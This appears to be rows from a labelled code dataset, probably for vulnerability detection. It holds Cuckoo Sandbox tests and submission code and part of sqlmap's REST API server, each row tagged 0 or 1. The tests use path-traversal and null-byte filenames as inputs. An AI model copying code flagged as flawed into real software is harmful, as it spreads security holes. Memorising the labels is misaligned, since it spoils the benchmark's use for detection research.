        assert Files.sha1_file(filepath) == ""42525bb6d3b0dc06bb78ae548733e8fbb55446b3""
        assert Files.sha256_file(filepath) == ""0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb""

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""foo"")
        Files.create((dirpath, ""foo""), ""a.txt"", ""bar"")

        filepath = os.path.join(dirpath, ""foo"", ""a.txt"")
        assert open(filepath, ""rb"").read() == ""bar""

    def test_fd_exhaustion(self):
        fd, filepath = tempfile.mkstemp()

        for x in xrange(0x100):
            Files.temp_put(""foo"")

        fd2, filepath = tempfile.mkstemp()

        # Let's leave a bit of working space.
        assert fd2 - fd < 64

class TestStorage:
    def test_basename(self):
        assert Storage.get_filename_from_path(""C:\\a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:\\\x00a.txt"") == ""\x00a.txt""
        assert Storage.get_filename_from_path(""/tmp/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""../../b.txt"") == ""b.txt""
        assert Storage.get_filename_from_path(""..\\..\\c.txt"") == ""c.txt""

class TestConvertChar:
    def test_utf(self):
        assert ""\\xe9"", utils.convert_char(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_char(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_char(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_char(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_char("" "")

class TestConvertToPrintable:
    def test_utf(self):
        assert ""\\xe9"" == utils.convert_to_printable(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_to_printable(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_to_printable(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_to_printable(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_to_printable("" "")

    def test_non_printable(self):
        assert r""\x0b"" == utils.convert_to_printable(chr(11))

class TestIsPrintable:
    def test_utf(self):
        assert not utils.is_printable(u""\xe9"")

    def test_digit(self):
        assert utils.is_printable(u""9"")

    def test_literal(self):
        assert utils.is_printable(""e"")

    def test_punctation(self):
        assert utils.is_printable(""."")

    def test_whitespace(self):
        assert utils.is_printable("" "")

    def test_non_printable(self):
        assert not utils.is_printable(chr(11))

def test_version():
    from cuckoo import __version__
    from cuckoo.misc import version
    assert __version__ == version

def test_exception():
    s = utils.exception_message()
    assert ""Cuckoo version: %s"" % cuckoo.__version__ in s
    assert ""alembic:"" in s
    assert ""django-extensions:"" in s
    assert ""peepdf:"" in s
    assert ""sflock:"" in s

def test_guid():
    assert utils.guid_name(""{0002e005-0000-0000-c000-000000000046}"") == ""InprocServer32""
    assert utils.guid_name(""{13709620-c279-11ce-a49e-444553540000}"") == ""Shell""

def test_jsbeautify():
    js = {
        ""if(1){a(1,2,3);}"": ""if (1) {\n    a(1, 2, 3);\n}"",
    }
    for k, v in js.items():
        assert utils.jsbeautify(k) == v

@mock.patch(""cuckoo.common.utils.jsbeautifier"")
def test_jsbeautify_packer(p, capsys):
    def beautify(s):
        print u""error: Unknown p.a.c.k.e.r. encoding.\n"",

    p.beautify.side_effect = beautify
    utils.jsbeautify(""thisisjavascript"")
    out, err = capsys.readouterr()
    assert not out and not err

def test_htmlprettify():
    html = {
        ""<a href=google.com>wow</a>"": '<a href=""google.com"">\n wow\n</a>',
    }
    for k, v in html.items():
        assert utils.htmlprettify(k) == v

def test_temppath():
    dirpath = tempfile.mkdtemp()
    set_cwd(dirpath)
    Folders.create(dirpath, ""conf"")

    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = ""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /tmp""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /custom/directory""
    )
    assert temppath() == ""/custom/directory""

def test_bool():
    assert utils.parse_bool(""true"") is True
    assert utils.parse_bool(""True"") is True
    assert utils.parse_bool(""yes"") is True
    assert utils.parse_bool(""on"") is True
    assert utils.parse_bool(""1"") is True

    assert utils.parse_bool(""false"") is False
    assert utils.parse_bool(""False"") is False
    assert utils.parse_bool(""None"") is False
    assert utils.parse_bool(""no"") is False
    assert utils.parse_bool(""off"") is False
    assert utils.parse_bool(""0"") is False

    assert utils.parse_bool(""2"") is True
    assert utils.parse_bool(""3"") is True

    assert utils.parse_bool(True) is True
    assert utils.parse_bool(1) is True
    assert utils.parse_bool(2) is True
    assert utils.parse_bool(False) is False
    assert utils.parse_bool(0) is False

def test_supported_version():
    assert utils.supported_version(""2.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.0"") is True

    assert utils.supported_version(""2.0.1a1"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.1a1"", ""2.0.1a0"", ""2.0.1b1"") is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1"", None) is False
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", None) is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", ""2.0.1"") is True

def test_validate_url():
    assert utils.validate_url(""http://google.com/"")
    assert utils.validate_url(""google.com"")
    assert utils.validate_url(""google.com/test"")
    assert utils.validate_url(""https://google.com/"")
    assert not utils.validate_url(""ftp://google.com/"")
/n/n/n",0
45,45,168cabf86730d56b7fa319278bf0f0034052666a,"/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, data[""data""])
                filedata = open(filepath, ""rb"").read()

                unpacked = sflock.unpack(
                    filepath=filename, contents=filedata,
                    password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree()

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return {
            ""files"": files,
            ""path"": submit.tmp_path,
        }

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""per_file_options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING
from cuckoo.common.mongo import mongo

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")
        data = {}

        task = db.view_task(task_id, details=True)
        if task:
            entry = task.to_dict()
            entry[""guest""] = {}
            if task.guest:
                entry[""guest""] = task.guest.to_dict()

            entry[""errors""] = []
            for error in task.errors:
                entry[""errors""].append(error.message)

            entry[""sample""] = {}
            if task.sample_id:
                sample = db.view_sample(task.sample_id)
                entry[""sample""] = sample.to_dict()

            data[""task""] = entry
        else:
            return Exception(""Task not found"")

        return data

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        data = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""data"": data,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/n",1
56,56,b4bb4c393b26072b9a47f787be134888b983af60,"lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

